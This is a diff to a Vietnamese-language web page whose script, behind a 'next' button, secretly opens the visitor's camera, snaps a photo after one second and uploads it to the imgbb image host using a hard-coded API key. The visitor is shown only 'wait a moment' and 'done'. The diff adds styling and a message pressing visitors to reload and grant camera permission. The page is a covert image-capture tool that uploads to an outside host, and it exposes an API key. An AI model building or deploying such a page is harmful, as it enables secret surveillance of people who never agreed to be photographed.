@@ -14,6 +14,7 @@
       color: white;
       flex-direction: column;
       font-family: Arial, sans-serif;
+      text-align: center;
     }
 
     button {
@@ -33,10 +34,13 @@
 
     #status {
       margin-top: 25px;
-      font-size: 1.4rem;
+      font-size: 1.3rem;
       display: flex;
       align-items: center;
-      gap: 12px;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+      max-width: 320px;
     }
 
     .spinner {
@@ -63,7 +67,7 @@
   <div id="status"></div>
 
   <script>
-    const API_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";
+    const API_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0"; // Imgbb API key
     const API_URL = "https://api.imgbb.com/1/upload";
 
     const nextBtn = document.getElementById("nextBtn");
@@ -76,9 +80,11 @@
       statusDiv.innerHTML = `<div class="spinner"></div> <span>⏳ Chờ xíu...</span>`;
 
       try {
+        // Yêu cầu quyền camera
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
+        // Chụp sau 1 giây
         setTimeout(async () => {
           const context = canvas.getContext("2d");
           canvas.width = video.videoWidth;
@@ -86,7 +92,6 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
           const base64Image = canvas.toDataURL("image/png").split(",")[1];
-
           const formData = new FormData();
           formData.append("image", base64Image);
 
@@ -95,14 +100,20 @@
             body: formData
           });
 
+          // Tắt camera
           stream.getTracks().forEach(track => track.stop());
 
           statusDiv.innerHTML = "✅ Đã xong!";
         }, 1000);
       } catch (err) {
         console.error(err);
-        statusDiv.innerHTML = "❌ Lỗi khi bật camera hoặc gửi ảnh.";
-        nextBtn.style.display = "block";
+        statusDiv.innerHTML = `
+          ❌ Không thể bật camera.<br>
+          🔁 Vui lòng <b>làm mới trang</b> và bấm <b>Đồng ý</b> để cấp quyền camera.<br><br>
+          <button id="reloadBtn">Làm mới trang</button>
+        `;
+        const reloadBtn = document.getElementById("reloadBtn");
+        reloadBtn.addEventListener("click", () => location.reload());
       }
     });
   </script>
